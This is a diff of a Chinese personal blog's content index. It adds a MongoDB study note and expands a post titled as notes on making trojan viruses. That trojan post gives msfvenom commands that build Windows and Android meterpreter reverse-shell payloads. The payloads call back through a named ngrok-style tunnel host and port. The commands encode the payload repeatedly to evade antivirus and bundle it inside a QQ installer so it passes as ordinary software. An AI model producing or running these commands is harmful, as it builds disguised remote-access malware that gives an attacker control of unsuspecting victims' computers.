@@ -87,6 +87,376 @@
       </tags>
   </entry>
   <entry>
+    <title>MongDB学习笔记</title>
+    <url>/2023/11/14/%E7%BC%96%E7%A8%8B%E6%8A%80%E8%83%BD/MongDB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="MongDB学习笔记"><a href="#MongDB学习笔记" class="headerlink" title="MongDB学习笔记"></a>MongDB学习笔记</h1><h2 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h2><h3 id="在docker中下载Mongdb"><a href="#在docker中下载Mongdb" class="headerlink" title="在docker中下载Mongdb"></a>在docker中下载Mongdb</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull mongo:4.4</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&quot;3.9&quot;</span></span><br><span class="line">services:</span><br><span class="line">  mongodb:</span><br><span class="line">    image: mongo:<span class="number">4.4</span></span><br><span class="line">    container_name: mongodb</span><br><span class="line">    environment:</span><br><span class="line">      - TZ=Asia/Shanghai</span><br><span class="line">      - MONGO_INITDB_DATABASE=mongdb</span><br><span class="line">      - MONGO_INITDB_ROOT_USERNAME=root</span><br><span class="line">      - MONGO_INITDB_ROOT_PASSWORD=<span class="number">123456</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;27017:27017&quot;</span></span><br><span class="line">    volumes:</span><br><span class="line">      - D:\Data\Document\DataSource\MongDB\data:/data/db</span><br><span class="line">      - D:\Data\Document\DataSource\MongDB\log:/data/logs</span><br><span class="line">      - D:\Data\Document\DataSource\MongDB\config:/data/configdb</span><br><span class="line">    command: mongod --config /data/configdb/mongod.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="MongoDB配置文件mongod-conf"><a href="#MongoDB配置文件mongod-conf" class="headerlink" title="MongoDB配置文件mongod.conf"></a>MongoDB配置文件mongod.conf</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemLog:</span><br><span class="line">  destination: file</span><br><span class="line">  path: /var/log/mongodb/mongod.log</span><br><span class="line">  logAppend: true</span><br><span class="line">storage:</span><br><span class="line">  dbPath: /data/db</span><br><span class="line">  journal:</span><br><span class="line">    enabled: true</span><br><span class="line">  wiredTiger:</span><br><span class="line">    engineConfig:</span><br><span class="line">      cacheSizeGB: 1</span><br><span class="line">  engine: wiredTiger</span><br><span class="line">  directoryPerDB: true</span><br><span class="line">  journal:</span><br><span class="line">    enabled: true</span><br><span class="line">  mmapv1:</span><br><span class="line">    smallFiles: true</span><br><span class="line">    journal:</span><br><span class="line">      enabled: true</span><br><span class="line">net:</span><br><span class="line">  bindIpAll: true</span><br><span class="line">  port: 27017</span><br><span class="line">  protocol: tcp</span><br><span class="line">  maxIncomingConnections: 10000</span><br><span class="line">security:</span><br><span class="line">  authorization: enabled</span><br></pre></td></tr></table></figure>
+
+<h2 id="MongoDB的CRUD"><a href="#MongoDB的CRUD" class="headerlink" title="MongoDB的CRUD"></a>MongoDB的CRUD</h2><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><table>
+<thead>
+<tr>
+<th align="center">SQL术语&#x2F;概念</th>
+<th align="center">MongoDB术语&#x2F;概念</th>
+<th align="center">解释&#x2F;说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">database</td>
+<td align="center">database</td>
+<td align="center">数据库</td>
+</tr>
+<tr>
+<td align="center">table</td>
+<td align="center">collection</td>
+<td align="center">数据库表&#x2F;集合</td>
+</tr>
+<tr>
+<td align="center">row</td>
+<td align="center">document</td>
+<td align="center">数据记录行&#x2F;文档</td>
+</tr>
+<tr>
+<td align="center">column</td>
+<td align="center">field</td>
+<td align="center">数据字段&#x2F;域</td>
+</tr>
+<tr>
+<td align="center">index</td>
+<td align="center">index</td>
+<td align="center">索引</td>
+</tr>
+<tr>
+<td align="center">table joins</td>
+<td align="center"></td>
+<td align="center">表连接,MongoDB不支持</td>
+</tr>
+<tr>
+<td align="center">primary key</td>
+<td align="center">primary key</td>
+<td align="center">主键,MongoDB自动将_id字段设置为主键</td>
+</tr>
+</tbody></table>
+<h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><h4 id="显示所有数据的列表"><a href="#显示所有数据的列表" class="headerlink" title="显示所有数据的列表"></a>显示所有数据的列表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show dbs</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>执行 <code>db</code> 命令可以显示当前数据库对象或集合。</p>
+</li>
+<li><p>运行<code>use 数据库名</code>命令，可以连接到一个指定的数据库。</p>
+</li>
+<li><p>数据库也通过名字来标识。数据库名可以是满足以下条件的任意UTF-8字符串。</p>
+<blockquote>
+<p>不能是空字符串（””)。</p>
+<p>不得含有’ ‘（空格)、.、$、&#x2F;、\和\0 (空字符)。</p>
+<p>应全部小写。</p>
+<p>最多64字节。</p>
+</blockquote>
+</li>
+</ol>
+<h4 id="特殊的数据库"><a href="#特殊的数据库" class="headerlink" title="特殊的数据库"></a>特殊的数据库</h4><p>有一些数据库名是保留的，可以直接访问这些有特殊作用的数据库。</p>
+<ul>
+<li><strong>admin</strong>： 从权限的角度来看，这是”root”数据库。要是将一个用户添加到这个数据库，这个用户自动继承所有数据库的权限。一些特定的服务器端命令也只能从这个数据库运行，比如列出所有的数据库或者关闭服务器。</li>
+<li><strong>local:</strong> 这个数据永远不会被复制，可以用来存储限于本地单台服务器的任意集合</li>
+<li><strong>config</strong>: 当Mongo用于分片设置时，config数据库在内部使用，用于保存分片的相关信息。</li>
+</ul>
+<h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use DATABASE_NAME</span><br></pre></td></tr></table></figure>
+
+<h4 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.dropDatabase()</span><br></pre></td></tr></table></figure>
+
+<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><table>
+<thead>
+<tr>
+<th align="center">数据类型</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">String</td>
+<td align="center">字符串。存储数据常用的数据类型。在 MongoDB 中，UTF-8 编码的字符串才是合法的。</td>
+</tr>
+<tr>
+<td align="center">Integer</td>
+<td align="center">整型数值。用于存储数值。根据你所采用的服务器，可分为 32 位或 64 位。</td>
+</tr>
+<tr>
+<td align="center">Boolean</td>
+<td align="center">布尔值。用于存储布尔值（真&#x2F;假）。</td>
+</tr>
+<tr>
+<td align="center">Double</td>
+<td align="center">双精度浮点值。用于存储浮点值。</td>
+</tr>
+<tr>
+<td align="center">Min&#x2F;Max keys</td>
+<td align="center">将一个值与 BSON（二进制的 JSON）元素的最低值和最高值相对比。</td>
+</tr>
+<tr>
+<td align="center">Array</td>
+<td align="center">用于将数组或列表或多个值存储为一个键。</td>
+</tr>
+<tr>
+<td align="center">Timestamp</td>
+<td align="center">时间戳。记录文档修改或添加的具体时间。</td>
+</tr>
+<tr>
+<td align="center">Object</td>
+<td align="center">用于内嵌文档。</td>
+</tr>
+<tr>
+<td align="center">Null</td>
+<td align="center">用于创建空值。</td>
+</tr>
+<tr>
+<td align="center">Symbol</td>
+<td align="center">符号。该数据类型基本上等同于字符串类型，但不同的是，它一般用于采用特殊符号类型的语言。</td>
+</tr>
+<tr>
+<td align="center">Date</td>
+<td align="center">日期时间。用 UNIX 时间格式来存储当前日期或时间。你可以指定自己的日期时间：创建 Date 对象，传入年月日信息。</td>
+</tr>
+<tr>
+<td align="center">Object ID</td>
+<td align="center">对象 ID。用于创建文档的 ID。</td>
+</tr>
+<tr>
+<td align="center">Binary Data</td>
+<td align="center">二进制数据。用于存储二进制数据。</td>
+</tr>
+<tr>
+<td align="center">Code</td>
+<td align="center">代码类型。用于在文档中存储 JavaScript 代码。</td>
+</tr>
+<tr>
+<td align="center">Regular expression</td>
+<td align="center">正则表达式类型。</td>
+</tr>
+</tbody></table>
+<h3 id="集合操作"><a href="#集合操作" class="headerlink" title="集合操作"></a>集合操作</h3><h4 id="创建集合"><a href="#创建集合" class="headerlink" title="创建集合"></a>创建集合</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.createCollection(name, options)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参数说明：</p>
+<ul>
+<li>name: 要创建的集合名称</li>
+<li>options: 可选参数, 指定有关内存大小及索引的选项</li>
+</ul>
+</blockquote>
+<h4 id="删除集合"><a href="#删除集合" class="headerlink" title="删除集合"></a>删除集合</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.集合名称.drop()</span><br></pre></td></tr></table></figure>
+
+<h3 id="文档操作"><a href="#文档操作" class="headerlink" title="文档操作"></a>文档操作</h3><h4 id="查询文档"><a href="#查询文档" class="headerlink" title="查询文档"></a>查询文档</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">db.collection.find(query, projection)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><strong>query</strong> ：可选，使用查询操作符指定查询条件</li>
+<li><strong>projection</strong> ：可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）。</li>
+</ul>
+</blockquote>
+<p>如果你需要以易读的方式来读取数据，可以使用 pretty() 方法，语法格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;db.col.find().pretty()</span><br></pre></td></tr></table></figure>
+
+<p>pretty() 方法以格式化的方式来显示所有文档。</p>
+<h4 id="插入文档"><a href="#插入文档" class="headerlink" title="插入文档"></a>插入文档</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.COLLECTION_NAME.insert(document)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.COLLECTION_NAME.save(document)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li>save()：如果 _id 主键存在则更新数据，如果不存在就插入数据。该方法新版本中已废弃，可以使用 <strong>db.collection.insertOne()</strong> 或 <strong>db.collection.replaceOne()</strong> 来代替。</li>
+<li>insert(): 若插入的数据主键已经存在，则会抛 <strong>org.springframework.dao.DuplicateKeyException</strong> 异常，提示主键重复，不保存当前数据。</li>
+</ul>
+</blockquote>
+<p><strong>3.2 版本之后新增了 db.collection.insertOne() 和 db.collection.insertMany()。</strong></p>
+<p>db.collection.insertOne() 用于向集合插入一个新文档，语法格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.collection.insertOne(</span><br><span class="line">   &lt;document&gt;,</span><br><span class="line">   &#123;</span><br><span class="line">      writeConcern: &lt;document&gt;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>db.collection.insertMany() 用于向集合插入一个多个文档，语法格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.collection.insertMany(</span><br><span class="line">   [ &lt;document 1&gt; , &lt;document 2&gt;, ... ],</span><br><span class="line">   &#123;</span><br><span class="line">      writeConcern: &lt;document&gt;,</span><br><span class="line">      ordered: &lt;boolean&gt;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>参数说明：</p>
+<ul>
+<li>document：要写入的文档。</li>
+<li>writeConcern：写入策略，默认为 1，即要求确认写操作，0 是不要求。</li>
+<li>ordered：指定是否按顺序写入，默认 true，按顺序写入。</li>
+</ul>
+<h4 id="更新文档"><a href="#更新文档" class="headerlink" title="更新文档"></a>更新文档</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.collection.update(</span><br><span class="line">   &lt;query&gt;,</span><br><span class="line">   &lt;update&gt;,</span><br><span class="line">   &#123;</span><br><span class="line">     upsert: &lt;boolean&gt;,</span><br><span class="line">     multi: &lt;boolean&gt;,</span><br><span class="line">     writeConcern: &lt;document&gt;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>参数说明：</strong></p>
+<ul>
+<li><strong>query</strong> : update的查询条件，类似sql update查询内where后面的。</li>
+<li><strong>update</strong> : update的对象和一些更新的操作符（如$,$inc…）等，也可以理解为sql update查询内set后面的</li>
+<li><strong>upsert</strong> : 可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。</li>
+<li><strong>multi</strong> : 可选，mongodb 默认是false,只更新找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部更新。</li>
+<li><strong>writeConcern</strong> :可选，抛出异常的级别。</li>
+</ul>
+</blockquote>
+<h4 id="删除文档"><a href="#删除文档" class="headerlink" title="删除文档"></a>删除文档</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.collection.remove(</span><br><span class="line">   &lt;query&gt;,</span><br><span class="line">   &lt;justOne&gt;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><strong>query</strong> :（可选）删除的文档的条件。</li>
+<li><strong>justOne</strong> : （可选）如果设为 true 或 1，则只删除一个文档，如果不设置该参数，或使用默认值 false，则删除所有匹配条件的文档。</li>
+<li><strong>writeConcern</strong> :（可选）抛出异常的级别。</li>
+</ul>
+</blockquote>
+<h2 id="数据库的其他操作"><a href="#数据库的其他操作" class="headerlink" title="数据库的其他操作"></a>数据库的其他操作</h2><h3 id="条件操作符"><a href="#条件操作符" class="headerlink" title="条件操作符"></a>条件操作符</h3><table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">格式</th>
+<th align="left">范例</th>
+<th align="left">RDBMS中的类似语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">等于</td>
+<td align="left"><code>&#123;&lt;key&gt;:&lt;value&gt;</code>}</td>
+<td align="left"><code>db.col.find(&#123;&quot;by&quot;:&quot;菜鸟教程&quot;&#125;).pretty()</code></td>
+<td align="left"><code>where by = &#39;菜鸟教程&#39;</code></td>
+</tr>
+<tr>
+<td align="left">小于</td>
+<td align="left"><code>&#123;&lt;key&gt;:&#123;$lt:&lt;value&gt;&#125;&#125;</code></td>
+<td align="left"><code>db.col.find(&#123;&quot;likes&quot;:&#123;$lt:50&#125;&#125;).pretty()</code></td>
+<td align="left"><code>where likes &lt; 50</code></td>
+</tr>
+<tr>
+<td align="left">小于或等于</td>
+<td align="left"><code>&#123;&lt;key&gt;:&#123;$lte:&lt;value&gt;&#125;&#125;</code></td>
+<td align="left"><code>db.col.find(&#123;&quot;likes&quot;:&#123;$lte:50&#125;&#125;).pretty()</code></td>
+<td align="left"><code>where likes &lt;= 50</code></td>
+</tr>
+<tr>
+<td align="left">大于</td>
+<td align="left"><code>&#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125;</code></td>
+<td align="left"><code>db.col.find(&#123;&quot;likes&quot;:&#123;$gt:50&#125;&#125;).pretty()</code></td>
+<td align="left"><code>where likes &gt; 50</code></td>
+</tr>
+<tr>
+<td align="left">大于或等于</td>
+<td align="left"><code>&#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125;</code></td>
+<td align="left"><code>db.col.find(&#123;&quot;likes&quot;:&#123;$gte:50&#125;&#125;).pretty()</code></td>
+<td align="left"><code>where likes &gt;= 50</code></td>
+</tr>
+<tr>
+<td align="left">不等于</td>
+<td align="left"><code>&#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125;</code></td>
+<td align="left"><code>db.col.find(&#123;&quot;likes&quot;:&#123;$ne:50&#125;&#125;).pretty()</code></td>
+<td align="left"><code>where likes != 50</code></td>
+</tr>
+</tbody></table>
+<h3 id="逻辑符号"><a href="#逻辑符号" class="headerlink" title="逻辑符号"></a>逻辑符号</h3><h4 id="AND-条件"><a href="#AND-条件" class="headerlink" title="AND 条件"></a>AND 条件</h4><p>MongoDB 的 find() 方法可以传入多个键(key)，每个键(key)以逗号隔开，即常规 SQL 的 AND 条件。</p>
+<p>语法格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;db.col.find(&#123;key1:value1, key2:value2&#125;).pretty()</span><br></pre></td></tr></table></figure>
+
+<h4 id="OR-条件"><a href="#OR-条件" class="headerlink" title="OR 条件"></a>OR 条件</h4><p>MongoDB OR 条件语句使用了关键字 <strong>$or</strong>,语法格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;db.col.find(</span><br><span class="line">   &#123;</span><br><span class="line">      $or: [</span><br><span class="line">         &#123;key1: value1&#125;, &#123;key2:value2&#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">).pretty()</span><br></pre></td></tr></table></figure>
+
+<h3 id="MongoDB-Limit与Skip方法"><a href="#MongoDB-Limit与Skip方法" class="headerlink" title="MongoDB Limit与Skip方法"></a>MongoDB Limit与Skip方法</h3><p>如果你需要在MongoDB中读取指定数量的数据记录，可以使用MongoDB的Limit方法，limit()方法接受一个数字参数，该参数指定从MongoDB中读取的记录条数。</p>
+<p>limit()方法基本语法如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;db.COLLECTION_NAME.find().limit(NUMBER)</span><br></pre></td></tr></table></figure>
+
+<h4 id="MongoDB-Skip-方法"><a href="#MongoDB-Skip-方法" class="headerlink" title="MongoDB Skip() 方法"></a>MongoDB Skip() 方法</h4><p>我们除了可以使用limit()方法来读取指定数量的数据外，还可以使用skip()方法来跳过指定数量的数据，skip方法同样接受一个数字参数作为跳过的记录条数。</p>
+<p>skip() 方法脚本语法格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;db.COLLECTION_NAME.find().limit(NUMBER).skip(NUMBER)</span><br></pre></td></tr></table></figure>
+
+<h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><h4 id="MongoDB-sort-方法"><a href="#MongoDB-sort-方法" class="headerlink" title="MongoDB sort() 方法"></a>MongoDB sort() 方法</h4><p>在 MongoDB 中使用 sort() 方法对数据进行排序，sort() 方法可以通过参数指定排序的字段，并使用 1 和 -1 来指定排序的方式，其中 1 为升序排列，而 -1 是用于降序排列。</p>
+<p>sort()方法基本语法如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;db.COLLECTION_NAME.find().sort(&#123;KEY:1&#125;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>索引通常能够极大的提高查询的效率，如果没有索引，MongoDB在读取数据时必须扫描集合中的每个文件并选取那些符合查询条件的记录。</p>
+<p>这种扫描全集合的查询效率是非常低的，特别在处理大量的数据时，查询可以要花费几十秒甚至几分钟，这对网站的性能是非常致命的。</p>
+<p>索引是特殊的数据结构，索引存储在一个易于遍历读取的数据集合中，索引是对数据库表中一列或多列的值进行排序的一种结构</p>
+<hr>
+<h4 id="createIndex-方法"><a href="#createIndex-方法" class="headerlink" title="createIndex() 方法"></a>createIndex() 方法</h4><p>MongoDB使用 createIndex() 方法来创建索引。</p>
+<blockquote>
+<p>注意在 3.0.0 版本前创建索引方法为 db.collection.ensureIndex()，之后的版本使用了 db.collection.createIndex() 方法，ensureIndex() 还能用，但只是 createIndex() 的别名。</p>
+</blockquote>
+<p>createIndex()方法基本语法格式如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;db.collection.createIndex(keys, options)</span><br></pre></td></tr></table></figure>
+
+<p>语法中 Key 值为你要创建的索引字段，1 为指定按升序创建索引，如果你想按降序来创建索引指定为 -1 即可。</p>
+<h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><table>
+<thead>
+<tr>
+<th align="left">表达式</th>
+<th align="left">描述</th>
+<th align="left">实例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">$sum</td>
+<td align="left">计算总和。</td>
+<td align="left">db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$sum : “$likes”}}}])</td>
+</tr>
+<tr>
+<td align="left">$avg</td>
+<td align="left">计算平均值</td>
+<td align="left">db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$avg : “$likes”}}}])</td>
+</tr>
+<tr>
+<td align="left">$min</td>
+<td align="left">获取集合中所有文档对应值得最小值。</td>
+<td align="left">db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$min : “$likes”}}}])</td>
+</tr>
+<tr>
+<td align="left">$max</td>
+<td align="left">获取集合中所有文档对应值得最大值。</td>
+<td align="left">db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$max : “$likes”}}}])</td>
+</tr>
+<tr>
+<td align="left">$push</td>
+<td align="left">将值加入一个数组中，不会判断是否有重复的值。</td>
+<td align="left">db.mycol.aggregate([{$group : {_id : “$by_user”, url : {$push: “$url”}}}])</td>
+</tr>
+<tr>
+<td align="left">$addToSet</td>
+<td align="left">将值加入一个数组中，会判断是否有重复的值，若相同的值在数组中已经存在了，则不加入。</td>
+<td align="left">db.mycol.aggregate([{$group : {_id : “$by_user”, url : {$addToSet : “$url”}}}])</td>
+</tr>
+<tr>
+<td align="left">$first</td>
+<td align="left">根据资源文档的排序获取第一个文档数据。</td>
+<td align="left">db.mycol.aggregate([{$group : {_id : “$by_user”, first_url : {$first : “$url”}}}])</td>
+</tr>
+<tr>
+<td align="left">$last</td>
+<td align="left">根据资源文档的排序获取最后一个文档数据</td>
+<td align="left">db.mycol.aggregate([{$group : {_id : “$by_user”, last_url : {$last : “$url”}}}])</td>
+</tr>
+</tbody></table>
+<h3 id="数据库的备份和恢复"><a href="#数据库的备份和恢复" class="headerlink" title="数据库的备份和恢复"></a>数据库的备份和恢复</h3><p>在Mongodb中我们使用mongodump命令来备份MongoDB数据。该命令可以导出所有数据到指定目录中。</p>
+<p>mongodump命令可以通过参数指定导出的数据量级转存的服务器。</p>
+<p>mongodump命令脚本语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;mongodump -h dbhost -d dbname -o dbdirectory</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>-h：</p>
+<p>MongoDB 所在服务器地址，例如：127.0.0.1，当然也可以指定端口号：127.0.0.1:27017</p>
+</li>
+<li><p>-d：</p>
+<p>需要备份的数据库实例，例如：test</p>
+</li>
+<li><p>-o：</p>
+<p>备份的数据存放位置，例如：c:\data\dump，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。</p>
+</li>
+</ul>
+<h3 id="SQL脚本"><a href="#SQL脚本" class="headerlink" title="SQL脚本"></a>SQL脚本</h3><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1]: <a href="https://www.runoob.com/mongodb/mongodb-tutorial.html">https://www.runoob.com/mongodb/mongodb-tutorial.html</a>	“菜鸟教程 MongoDB 教程”</p>
+]]></content>
+      <categories>
+        <category>编程技能</category>
+      </categories>
+      <tags>
+        <tag>mongodb</tag>
+        <tag>数据库</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL注入</title>
     <url>/2023/11/07/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[]]></content>
@@ -124,16 +494,55 @@
   <entry>
     <title>木马病毒制作的笔记</title>
     <url>/2023/11/07/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92%E5%88%B6%E4%BD%9C%E7%9A%84%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="木马病毒制作的笔记"><a href="#木马病毒制作的笔记" class="headerlink" title="木马病毒制作的笔记"></a>木马病毒制作的笔记</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p><a href="https://hsk.oray.com/">花生壳</a></p>
+    <content><![CDATA[<h1 id="木马病毒制作的笔记"><a href="#木马病毒制作的笔记" class="headerlink" title="木马病毒制作的笔记"></a>木马病毒制作的笔记</h1><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><h4 id="内网-穿透工具"><a href="#内网-穿透工具" class="headerlink" title="内网 穿透工具"></a>内网 穿透工具</h4><p><a href="https://hsk.oray.com/">花生壳</a></p>
 <p><a href="https://www.ngrok.cc/user.html">ngork</a></p>
-<h2 id="木马病毒的制作"><a href="#木马病毒的制作" class="headerlink" title="木马病毒的制作"></a>木马病毒的制作</h2><h3 id="windows病毒"><a href="#windows病毒" class="headerlink" title="windows病毒"></a>windows病毒</h3><h3 id="安卓病毒"><a href="#安卓病毒" class="headerlink" title="安卓病毒"></a>安卓病毒</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="加壳工具"><a href="#加壳工具" class="headerlink" title="加壳工具"></a>加壳工具</h4><h4 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h4><p>kali（发动控制的主机）</p>
+<p>windows（目标主机）</p>
+<h4 id="病毒制作工具"><a href="#病毒制作工具" class="headerlink" title="病毒制作工具"></a>病毒制作工具</h4><h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>我是采用<code>ngork</code>进行</p>
+<p>隧道id：<code>174035416011</code></p>
+<p>隧道端口:<code>10230</code></p>
+<p>服务器地址:	<code>free.idcfengye.com</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./sunny clientid 隧道ID</span><br></pre></td></tr></table></figure>
 
-<h2 id="病毒免杀"><a href="#病毒免杀" class="headerlink" title="病毒免杀"></a>病毒免杀</h2><h3 id="安卓病毒-1"><a href="#安卓病毒-1" class="headerlink" title="安卓病毒"></a>安卓病毒</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom --platform Android -p android/meterpreter/reverse_tcp LHOST=服务器地址（域名） LPORT=隧道端口 -e x86/shikata_ga_nai R &gt; black_1.apk</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="木马病毒的制作"><a href="#木马病毒的制作" class="headerlink" title="木马病毒的制作"></a>木马病毒的制作</h2><h3 id="windows病毒"><a href="#windows病毒" class="headerlink" title="windows病毒"></a>windows病毒</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=服务器地址 LPORT=隧道端口 -f exe &gt; /root/muma.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="多次编码并捆绑qq安装包的可执行程序"><a href="#多次编码并捆绑qq安装包的可执行程序" class="headerlink" title="多次编码并捆绑qq安装包的可执行程序"></a>多次编码并捆绑qq安装包的可执行程序</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=free.idcfengye.com LPORT=10230 -f raw | msfvenom -a x86 --platform windows -e x86/alpha_upper -i 10 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 10 -x QQ9.7.18.29256.exe -k -f exe &gt; csdn2.exe</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="目标机器中毒后的操作"><a href="#目标机器中毒后的操作" class="headerlink" title="目标机器中毒后的操作"></a>目标机器中毒后的操作</h2><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1]: <a href="https://blog.csdn.net/NuclearDalance/article/details/116450238">https://blog.csdn.net/NuclearDalance/article/details/116450238</a>	“使用Kali Linux系统生成木马病毒并实现远程控制计算机”<br>[2]: <a href="https://xz.aliyun.com/t/12893">https://xz.aliyun.com/t/12893</a>	“Android免杀小结”<br>[3]: <a href="https://cloud.tencent.com/developer/article/2245833">https://cloud.tencent.com/developer/article/2245833</a>	“使用Kali生成木马入侵安卓手机”</p>
-<p>[4]: <a href="https://bbs.kanxue.com/thread-254995.htm">https://bbs.kanxue.com/thread-254995.htm</a>	“[分享]免杀之安卓渗透”</p>
+<h3 id="安卓病毒"><a href="#安卓病毒" class="headerlink" title="安卓病毒"></a>安卓病毒</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="病毒免杀"><a href="#病毒免杀" class="headerlink" title="病毒免杀"></a>病毒免杀</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 -p windows/meterpreter/reverse_tcp lhost=192.168.255.130 lport=4444 -e x86/shikata_ga_nai -x QQ9.7.18.29256.exe -i 12 -f exe -o /kali/Desktop/csdn.exe</span><br></pre></td></tr></table></figure>
+
+
+
